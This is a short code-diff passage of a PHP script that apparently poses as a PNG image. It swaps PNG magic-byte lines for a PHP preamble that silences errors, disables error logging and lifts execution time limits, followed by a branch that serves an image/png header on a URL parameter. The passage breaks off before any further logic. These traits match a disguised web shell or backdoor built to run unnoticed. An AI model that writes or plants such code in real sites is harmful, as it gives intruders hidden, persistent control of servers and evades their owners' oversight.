@@ -1,9 +1,11 @@
-﻿﻿﻿﻿﻿﻿\x89\x50\x4E\x47\x0D\x0A\x1A\x0A
- PNG
-
-﻿\x89\x50\x4E\x47\x0D\x0A\x1A\x0A
-<?php
 
+<?php
+@error_reporting(E_ALL ^ E_NOTICE);
+@ini_set('error_log',NULL);
+@ini_set('log_errors',0);
+@ini_set('max_execution_time',0);
+@ini_set('magic_quotes_runtime', 0);
+@set_time_limit(0);
 // Url PNG signature
 if (isset($_GET['i'])) {
     header('Content-Type: image/png');
